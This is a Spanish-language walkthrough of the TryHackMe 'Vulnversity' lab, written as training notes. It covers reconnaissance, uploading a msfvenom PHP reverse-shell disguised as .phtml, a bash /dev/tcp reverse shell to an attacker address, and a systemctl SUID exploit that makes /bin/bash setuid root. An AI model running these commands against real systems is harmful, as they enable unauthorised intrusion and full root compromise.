
----
- TAG: #Escalada-De-Privilegios #Linux #Binarios #SUID 
-----
# Escalada de Privilegios con Binarios SUID

En este apartado vamos a aprender sobre la escalada de privilegios, centrándonos en **Binarios SUID** como alternativa a `sudo -l`.

## Requisitos

Para seguir este tutorial, necesitarás:

1. Una máquina atacante con **Kali Linux**.
2. Una máquina vulnerable de **TryHackMe** [Vulnversity](https://tryhackme.com/r/room/vulnversity).

---

## Escaneo y Exploración

En clases anteriores, hemos visto cómo vulnerar esta máquina, pero esta vez vamos a tratar de conseguir el acceso como usuario root a través de la escalada de privilegios con **Binarios SUID**.

### Escaneo con Nmap

Primero, realizamos un escaneo con Nmap:

```bash
nmap -sS -sC -sV -p- --open --min-rate=5000 -n -vvv -Pn 1.2.3.4 -oN escaneo
```

Este escaneo muestra que el puerto **3333** está abierto, en el cual corre un servidor web.

### Exploración de Directorios con Gobuster

Accedemos a la página web y copiamos la **URL** para buscar más directorios web, utilizando la herramienta **Gobuster**:

```bash
gobuster dir -u http://1.2.3.4:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Después del escaneo, encontramos el directorio `Internal`. Nos dirigimos a la página web agregando este directorio al final de la **URL**.

## Explotación de Vulnerabilidades

Una vez cargada la página, encontramos una funcionalidad que permite subir archivos. Esto nos da la idea de crear un payload con `msfvenom`, indicando nuestra dirección IP conectada a la VPN de TryHackMe:

```bash
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=443 -f raw > pwned.php
```

Si tratamos de subir el archivo `php`, no nos lo permitirá, así que lo convertimos en un archivo `phtml`. Ahora, si volvemos a intentarlo, el archivo se sube exitosamente.

### Localización del Payload

Para encontrar la ubicación donde se subió el archivo, realizamos **Fuzzing Web** nuevamente, pero esta vez en el directorio `http://1.2.3.4/Internal`:

```bash
gobuster dir -u http://1.2.3.4:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Encontramos el directorio `uploads`. Al cargarlo en la web, encontramos el archivo malicioso en formato `phtml`.

### Ejecución de la Reverse Shell

Nos ponemos en escucha en el puerto `443`:

```bash
nc -nlvp 443
```

Desde la página web, damos clic en el archivo para obtener la reverse shell. Como esta suele perderse a los pocos minutos, enviamos la conexión por el puerto `444`:

```bash
nc -nlvp 444
```

Desde la conexión en el puerto 443, nos enviamos la sesión bash de la siguiente manera:

```bash
bash -c "sh -i >& /dev/tcp/10.21.21.212/444 0>&1"
```

Con esto, obtendremos una sesión mucho más estable.

## Escalada de Privilegios

Una vez dentro, procedemos a realizar la escalada de privilegios.

### Búsqueda de Binarios SUID

En clases anteriores, hemos visto cómo usar `sudo -l` para encontrar vulnerabilidades que permitan la escalada de privilegios. Sin embargo, cuando `sudo -l` no es efectivo, podemos usar otro comando para encontrar **Binarios SUID** vulnerables, es decir, binarios con permisos de root dentro del sistema:

```bash
find / -perm -4000 2>/dev/null
```

Este comando nos mostrará una lista de binarios. Debemos identificar cuál es extraño, por ejemplo, `systemctl`.

### Verificación de Binarios con GTFOBins

Si no estás seguro de cuáles binarios deberían estar presentes, te recomiendo la página **GTFOBins**. Allí, puedes buscar si un binario es normal que esté presente o no. Si ingresas un binario y no aparece información, es porque es normal que esté ahí. Sin embargo, si buscas `systemctl`, verás que aparece información sobre cómo explotarlo con SUID y sudo.

### Configuración de Terminal

Para realizar cualquier ejecución de comandos, es recomendable ajustar la configuración de la terminal:

1. Crea un terminal en bash:
   ```bash
   script /dev/null -c bash
   ```
2. Sal de la conexión con `Ctrl + Z`.
3. Pon la terminal en primer plano:
   ```bash
   stty raw -echo; fg
   ```
4. Escribe `reset xterm`.
5. Luego, ejecuta los siguientes comandos:
   ```bash
   export SHELL=bash
   export TERM=xterm
   ```

## Creación y Ejecución de Script para Escalada

Una vez hecho esto, nos dirigimos al directorio `/tmp` para crear un script en bash con el código proporcionado por **GTFOBins**.

### Creación del Script

1. Crea el archivo `.sh`:
   ```bash
   nano escalada.sh
   ```
2. Configura el siguiente comando para poder cambiar los permisos de bash y obtener una shell como root:
   ```bash
   chmod u+s /bin/bash
   ```

Es importante indicar la ruta absoluta del binario para evitar errores. El script debería quedar así:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

### Ejecución del Script

Guarda el archivo y luego ejecuta el siguiente comando para obtener una shell como root:

```bash
bash escalada.sh
```

Si no hay errores, ejecuta lo siguiente:

```bash
bash -p
```

Si todo salió bien, deberías ver un prompt diferente. Para confirmarlo, ejecuta `whoami`. Si aparece "root", ¡la máquina ha sido vulnerada con éxito!

--- 

